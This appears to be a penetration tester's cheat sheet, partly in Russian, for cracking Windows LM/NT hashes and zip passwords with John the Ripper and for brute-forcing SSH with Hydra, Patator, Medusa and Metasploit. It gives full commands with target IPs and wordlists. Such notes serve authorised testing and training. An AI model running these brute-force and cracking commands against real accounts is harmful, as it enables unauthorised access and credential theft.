# Linux Hashes

# Windows Hashes

## LM hash brute

`john --test` - benchmark

`john sam.txt`

`john --show sam.txt` - вывод результатов

`cat ~/.john/john.pot` 

## NT hash brute

`john --format=nt sam.txt`

## Cracking NT with a cracked LM

`/usr/share/metasploit-framework/tools/password/lm2ntcrack.rb -t NTLM -p INTERNET12 -a 1274D7B32A9ABDDA01A5067FE9FBB32B`

`-p` - cracked LM hash
`-a` - not cracked NTLM hash


# Smb brute

## Password Guessing (подбор пароля пользователя)

Отбираем пароли по текущей парольной политике.
By default in Server 2016, passwords must meet the following minimum requirements:

1. Passwords must not contain the user's account name or parts of the user's full name that exceed two consecutive characters.
2. Passwords must be at least seven characters in length.
3. Passwords must contain characters from three of the following four categories:

a. English uppercase characters (A through Z)
b. English lowercase characters (a through z)
c. Base 10 digits (0 through 9)
d. Non-alphabetic characters (for example, !, $, #, %)

`cat ./rockyou.txt | sudo pw-inspector -m 7 -n -u -l -p -c 3 -o ws2016default.lst`

## Password Spray (проверка одного пароля для многих пользователей)
This is a good technique when you have a large list of user accounts and you have to be careful of login policies locking out the account after too many failed password guesses.

## Hydra 
Если хочется графической оболочки _xHydra_. Необходимо указать:
- Target -> Target(s)
- Target -> Protocol
- Passwords -> Username
- Passwords -> Password (PasswordList)
- Passwords -> Try login as password 
- Passwords -> Try empty passwords
- Start -> Start

# SSH Brute

## Patator
Для подбора пароля средствами Patator используем команду:

`patator ssh_login host=192.168.60.50 user=test password=FILE0 0=/root/wordlist -x ignore:mesg=’Authentication failed’`

где:
- ssh_login — необходимый модуль
- host – наша цель
- user – логин пользователя, к которому подбирается пароль или файл с логинами для множественного подбора
- password – словарь с паролями
- `-x ignore:mesg=’Authentication failed’` — команда не выводить на экран строку, имеющую данное сообщение. Параметр фильтрации подбирается индивидуально.

## Hydra
Для подбора пароля используя Hydra выполним команду:

`hydra -V -f -t 4 -l bestadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.81`

где:
- -V – показывать пару логин+пароль во время перебора
- -f – остановка как только будет найден пароль для указанного логина
- -P – путь до словаря с паролями
- ssh://192.168.60.50 – указание сервиса и IP-адрес жертвы

## Medusa
Для подбора пароля с использованием Medusa выполним команду:

`medusa -h 192.168.60.50 -u test -P /root/wordlist -M ssh -f -v 6`

где:
- -h – IP-адрес жертвы
- -u – логин
- -P – путь к словарю
- -M – выбор модуля
- -f – остановка после нахождения валидной пары логин/пароль
- -v – настройка отображения сообщений на экране во время процесса подбора

## Metasploit
Произведем поиск инструмента для проведения brute-force атаки по SSH:
`search ssh_login`

Задействуем модуль:

`use auxiliary/scanner/ssh/ssh_login`

Для просмотра необходимых параметров, воспользуемся командой show options. Для нас это:
- rhosts – IP-адрес жертвы
- rport – порт
- username – логин SSH
- userpass_file – путь до словаря
- stop_on_success – остановка, как только найдется пара логин/пароль
- threads – количество потоков

Указание необходимых параметров производится через команду "set".

`set rhosts 192.168.60.50`

`set username test`

`set userpass_file /root/wordlist`

`set stop_on_success yes`

`set threads 4`

`set rport 22`

# Brute zip

1. Извлекает хеш пароля в формате, который подходит для John the Ripper.

	`zip2john <target.zip> > hash`
	
2. Попытка обращения хеша

	`john hash`



